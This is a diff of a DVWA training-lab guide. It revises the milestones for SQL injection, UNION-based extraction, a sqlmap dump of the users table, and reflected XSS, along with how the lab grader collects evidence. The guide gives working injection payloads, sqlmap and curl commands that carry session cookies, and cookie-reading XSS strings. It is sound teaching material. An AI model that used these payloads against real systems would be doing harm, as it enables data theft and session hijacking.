@@ -45,11 +45,12 @@ If **Open DVWA** is not available yet on your deployment, use Kali CLI (`curl`) 
 1' OR '1'='1
 ```
 
-**Done when:** Multiple user rows appear.  
-**Then:** On Kali, capture real evidence for Manual Check. The browser step alone does not score yet. Use a **curl** you actually ran (you may keep `$TARGET_DVWA`). Replace `<session_id>` with your real `PHPSESSID`. The `id` must be a real probe (`1'`, `1%27`, or an OR payload such as `1' OR '1'='1`). Saving the response to `/tmp/sqli_probe.txt` also counts when that file contains a SQL syntax error, `ID: 1'`, or `First name:`.
+**Done when:** Multiple user rows appear in **Open DVWA**.  
+Each browser response scores only the milestone it proves. Submit this OR payload (or `1'` when the page shows a SQL syntax error), then click **Manual Check** on Injection Point. You do not need Kali for this milestone.
+
+Optional Kali fallback (if browser scoring is unavailable):
 
 ```bash
-# Probe the injection point from Kali with curl and save the response:
 curl -s -b "PHPSESSID=<session_id>; security=low" \
   "http://$TARGET_DVWA/dvwa/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" > /tmp/sqli_probe.txt
 ```
@@ -59,7 +60,7 @@ curl -s -b "PHPSESSID=<session_id>; security=low" \
 <details>
 <summary>Hint</summary>
 
-Copy your `PHPSESSID` from browser DevTools → Application → Cookies if using curl/sqlmap later. An `echo` of the payload string is not evidence.
+A users-table dump later does **not** complete this milestone. An `echo` of the payload string is not evidence.
 
 </details>
 
@@ -69,31 +70,21 @@ Copy your `PHPSESSID` from browser DevTools → Application → Cookies if using
 
 **Goal:** Pull useful data with UNION-based injection (still security Low).
 
-In the DVWA **User ID** field (browser), try in order:
+In the DVWA **User ID** field (browser), submit this payload for **this** milestone (a separate submit from Tasks 1 and 3):
 
 ```text
 1' UNION SELECT null, database() -- -
 ```
 
+**Done when:** The Surname (or First name) cell shows the database name `dvwa`. Then **Manual Check** on Database Extraction. You do not need Kali for this milestone.
+
+You may also explore:
+
 ```text
 1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() -- -
 ```
 
-```text
-1' UNION SELECT user, password FROM users -- -
-```
-
-On Kali, record evidence for Manual Check by saving a line you **saw** in DVWA (username plus the 32-character hex hash), not the UNION sentence itself:
-
-```bash
-printf 'admin:5f4dcc3b5aa765d61d8327deb882cf99\n' > /tmp/sqli_users.txt
-# Replace with a username:hash pair you actually extracted
-```
-
-A file that only contains `UNION SELECT …` will FAIL.
-
-**Done when:** You know the database name and `/tmp/sqli_users.txt` has a real `username:32-hex-hash` line.  
-**Manual Check** on Database Extraction.
+Optional Kali fallback: save a real `username:32-hex-hash` line you saw into `/tmp/sqli_users.txt` (not the UNION sentence itself).
 
 <details>
 <summary>Hint</summary>
@@ -104,37 +95,34 @@ DVWA Low often needs a space before `-- -` and the correct column count (two col
 
 ---
 
-### Task 3 — Admin Hash via SQLMap (Milestone 3)
+### Task 3 — Admin Hash (Milestone 3)
 
-**Goal:** Automate dump of the `users` table from **Kali** (attacker box).
+**Goal:** Extract the admin password hash. Prefer the browser; sqlmap on Kali remains an optional fallback.
 
-1. From the browser, copy `PHPSESSID`.  
-2. On Kali:
+**Browser (preferred):** In DVWA **User ID**, submit (separate from Tasks 1 and 2):
+
+```text
+1' UNION SELECT user, password FROM users -- -
+```
+
+**Done when:** A Surname cell shows a 32-character hex hash. Then **Manual Check** on Admin Hash. A users dump does **not** fill in milestones 1 and 2 automatically.
+
+**Optional Kali fallback (sqlmap):**
 
 ```bash
-sqlmap -u "http://$TARGET_DVWA/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie="PHPSESSID=<session_id>; security=low" \
-  --dbs --batch
-
 sqlmap -u "http://$TARGET_DVWA/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie="PHPSESSID=<session_id>; security=low" \
   -D dvwa -T users --dump --batch
-```
 
-Keep `$TARGET_DVWA`. Replace only `<session_id>` with the real `PHPSESSID`. After the dump, write the admin hash (32 hex characters) into `/tmp/admin_hash.txt`:
-
-```bash
-# Paste the admin password hash from the dump (32 hex chars only):
 printf '5f4dcc3b5aa765d61d8327deb882cf99\n' > /tmp/admin_hash.txt
 ```
 
-**Done when:** sqlmap has dumped `users` on Kali **and** `/tmp/admin_hash.txt` contains a 32-hex hash. A non-empty file alone is not enough. `/tmp/sqlmap_output.txt` is not scored.  
-**Manual Check** on Admin Hash.
+Keep `$TARGET_DVWA`. Replace only `<session_id>`. The hash file must be 32 hex characters. A non-empty file alone is not enough.
 
 <details>
 <summary>Hint</summary>
 
-SQLMap **must** run on Kali so scoring sees it. Running sqlmap only on your laptop will not complete Milestone 3. Do not leave `<session_id>` or `<admin_hash_here>` in the commands or files.
+Do not leave `<session_id>` or `<admin_hash_here>` in commands or files.
 
 </details>
 
@@ -154,19 +142,15 @@ SQLMap **must** run on Kali so scoring sees it. Running sqlmap only on your lapt
 *(Alternatively: `<script>alert(document.cookie)</script>` or `<script>alert(1)</script>`)*
 
 3. Click **Submit**.
-4. **Done when:** The browser executes the JavaScript and displays an alert pop-up window, confirming that user-supplied script tags were reflected in the HTTP response without sanitization.
-5. On Kali, prove payload reflection and record evidence for scoring:
+4. **Done when:** The browser executes the JavaScript (alert) and the page shows unescaped `Hello <script…`. Then **Manual Check** on Reflected XSS. Open DVWA is enough; Kali is optional.
+
+Optional Kali fallback:
 
 ```bash
-# Send the reflected XSS probe from Kali with curl and save DVWA's response:
 curl -s -b "PHPSESSID=<session_id>; security=low" \
   "http://$TARGET_DVWA/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E&Submit=Submit" > /tmp/xss_reflected.txt
-
-# Confirm that the server response contains the unescaped reflection:
 grep -i "Hello <script" /tmp/xss_reflected.txt
 ```
-
-6. Click **Manual Check** on **Reflected XSS** (Milestone 4).
 
 <details>
 <summary>Hint</summary>
@@ -183,8 +167,9 @@ Reflected XSS occurs when an application receives data in an HTTP request and in
 |---|---|
 | Blank DVWA / connection refused | Use portal **Open DVWA** or confirm `$TARGET_DVWA` from Kali: `curl -sI http://$TARGET_DVWA/dvwa/` |
 | Only one row returned | Security not Low, or payload syntax |
-| Manual Check FAIL on M3 | sqlmap was not run **on Kali**; re-run dump there |
-| Manual Check FAIL on M4 | XSS probe not recorded in Kali bash history (curl targeting xss_r with script payload) or `/tmp/xss_reflected.txt` lacking `Hello <script` |
+| Manual Check FAIL on M1–M3 | Submit the three payloads separately in Open DVWA (OR / `database()` / `FROM users`); one users dump does not complete 1 and 2 |
+| Manual Check FAIL on M3 (Kali path) | sqlmap on Kali plus a 32-hex `/tmp/admin_hash.txt` |
+| Manual Check FAIL on M4 | Payload not reflected as `Hello <script` in Open DVWA (or Kali curl/`/tmp/xss_reflected.txt` fallback) |
 | XSS alert does not pop up | DVWA security is not set to Low; check DVWA Security menu |
 | Session expired in sqlmap | Log into DVWA again; refresh PHPSESSID |
 
